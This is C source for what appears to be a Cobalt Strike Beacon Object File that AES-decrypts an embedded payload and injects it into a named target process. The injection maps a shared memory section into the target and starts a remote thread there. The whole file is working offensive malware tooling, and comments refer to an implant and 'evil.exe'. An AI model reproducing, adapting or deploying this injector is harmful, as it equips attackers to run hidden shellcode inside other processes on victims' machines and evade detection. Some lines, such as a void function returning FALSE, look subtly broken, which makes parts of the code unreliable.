#include "procinj-sectionmaps-bof.h"

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!ADVAPI32$CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
			return -1;
	}
	if (!ADVAPI32$CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!ADVAPI32$CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!ADVAPI32$CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!ADVAPI32$CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	
	ADVAPI32$CryptReleaseContext(hProv, 0);
	ADVAPI32$CryptDestroyHash(hHash);
	ADVAPI32$CryptDestroyKey(hKey);
	
	return 0;
}


int FindTarget(const char *procname) {
        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!KERNEL32$Process32First(hProcSnap, &pe32)) {
                KERNEL32$CloseHandle(hProcSnap);
                return 0;
        }
                
        while (KERNEL32$Process32Next(hProcSnap, &pe32)) {
                if (KERNEL32$lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        KERNEL32$CloseHandle(hProcSnap);
        return pid;
}

HANDLE FindThread(int pid){

	HANDLE hThread = NULL;
	THREADENTRY32 thEntry;

	thEntry.dwSize = sizeof(thEntry);
    HANDLE Snap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
		
	while (KERNEL32$Thread32Next(Snap, &thEntry)) {
		if (thEntry.th32OwnerProcessID == pid) 	{
			hThread = KERNEL32$OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
			break;
		}
	}
	KERNEL32$CloseHandle(Snap);
	
	return hThread;
}


// map section views injection
BOOL InjectVIEW(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	HANDLE hSection = NULL;
	PVOID pLocalView = NULL, pRemoteView = NULL;
	HANDLE hThread = NULL;
	CLIENT_ID cid;

	// create memory section
	NtCreateSection_t pNtCreateSection = (NtCreateSection_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateSection");
	if (pNtCreateSection == NULL)
		return FALSE;
	pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER) &payload_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

	// Create local section view on the current process that is writable and readable
	NtMapViewOfSection_t pNtMapViewOfSection = (NtMapViewOfSection_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtMapViewOfSection");
	if (pNtMapViewOfSection == NULL)
		return FALSE;
	pNtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalView, NULL, NULL, NULL, (SIZE_T *) &payload_len, ViewUnmap, NULL, PAGE_READWRITE);

	// throw the payload into the section reflected from the current process' virtual memory
	MSVCRT$memcpy(pLocalView, payload, payload_len);
	
	// Create remote section view (target process) that is executable
	pNtMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL, (SIZE_T *) &payload_len, ViewUnmap, NULL, PAGE_EXECUTE_READ);

	//printf("wait: pload = %p ; rview = %p ; lview = %p\n", payload, pRemoteView, pLocalView);
	//getchar();

	// Execute the payload from the created remote view which technically is pointing to the section of the current process and not of the target process. The target process doesnt have a handle to this section view.
	RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
	if (pRtlCreateUserThread == NULL)
		return FALSE;
	pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pRemoteView, 0, &hThread, &cid);
	if (hThread != NULL) {
		KERNEL32$WaitForSingleObject(hThread, 500);
		KERNEL32$CloseHandle(hThread);
	} else {
		BeaconPrintf(CALLBACK_OUTPUT, "Cannot create user thread on the target process.\n");
		return FALSE;
	}
	
	return TRUE;
}


// API used in the Injection Type:
// procinj-sectionmaps <procName>
void go(char *args, int alen) {
	int pid = 0;
    HANDLE hProc = NULL;
	BOOL res; 

	// TODO: Fix the Beacon string input processing
	datap parser;
	char* procName;  // This should be the binary in byte form.
	
	// Prepare data parser
	BeaconDataParse(&parser, args, alen);
	
	// Unpack Data
	//bufFullPath = BeaconDataExtract(&parser, NULL); // message should hold the full path to the evil.exe/evil.dll file. -> This is wrong. 
	procName = BeaconDataExtract(&parser, NULL);
	
	pid = FindTarget(procName);

	if (pid) {
		BeaconPrintf(CALLBACK_OUTPUT, "%s->PID = %d\n", procName,pid);

		// try to open target process
		hProc = KERNEL32$OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			// Decrypt and inject payload
			res = AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
			if(res == -1) {
				BeaconPrintf(CALLBACK_OUTPUT, "[*] Failed to decrypt the payload...\n");
				return FALSE;
			}
			InjectVIEW(hProc, payload, payload_len);
			KERNEL32$CloseHandle(hProc);
		} else {
			BeaconPrintf(CALLBACK_OUTPUT, "[*] Failed to open the process. Does the implant have necessary privilege and/or integrity for this operation?\n");
			return;
		}
	}
	return;
}
